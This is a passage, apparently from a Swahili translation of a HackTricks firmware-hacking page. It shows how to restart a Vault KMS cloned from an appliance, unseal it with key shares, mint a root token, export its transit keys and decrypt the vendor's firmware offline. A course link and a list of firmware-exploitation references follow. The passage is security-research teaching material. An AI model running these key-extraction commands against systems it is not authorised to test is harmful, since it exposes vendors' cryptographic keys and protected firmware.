Ikiwa appliance inasafirisha Vault binary ya awali pamoja na storage backend, kureplay mazingira hayo kwa kawaida ni rahisi kuliko kuimplement upya Vault internals:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Ukiwa na root kwenye KMS iliyoclone:

- Fanya transit keys ziweze ku-exportiwa ndani ya clone iliyotengwa pekee: `vault write transit/keys/<name>/config exportable=true`
- Export unwrap key: `vault read transit/export/encryption-key/<name>`
- Jaribu RSA key iliyorejeshwa kwa jozi halisi ya padding/hash iliyotumiwa na KMS. Kushindwa kwa decryption ya PKCS#1 v1.5 na kushindwa kwa decryption ya kawaida ya OAEP **hakuthibitishi** kuwa key si sahihi; flows nyingi zinazotumia Vault hutumia OAEP yenye SHA-256, huku libraries za kawaida zikisanidiwa awali kutumia SHA-1.
- Ikiwa payload inaanza na `Salted__`, rudia KDF ya OpenSSL ya vendor kikamilifu (`EVP_BytesToKey`, mara nyingi MD5 kwenye legacy appliances) kabla ya kujaribu decryption ya AES-CBC.

Hii hubadilisha tatizo la "firmware iliyosimbwa" kuwa tatizo la jumla zaidi: **rejesha operational keys za upande wa appliance, kisha rudia kwa usahihi vigezo kamili vya unwrap + KDF ukiwa offline**.

## Mafunzo na Vyeti

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking Firmware with Claude: Ujuzi wa Kiwango cha Senior, Autonomy ya Kiwango cha Junior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Mbinu ya Kupima Usalama wa Firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: Mwongozo Madhubuti wa Kushambulia Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Kutumia zero days kwenye hardware iliyoachwa – blogu ya Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jinsi Smart Device ya $20 Ilinipa Ufikiaji wa Nyumba Yako](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sasa Unamwona mi: Sasa UmePwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Kutumia Tesla Wall Connector kutoka kwenye charge port connector yake - Sehemu ya 2: kupita anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: Over-the-Air Exploitation ya Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
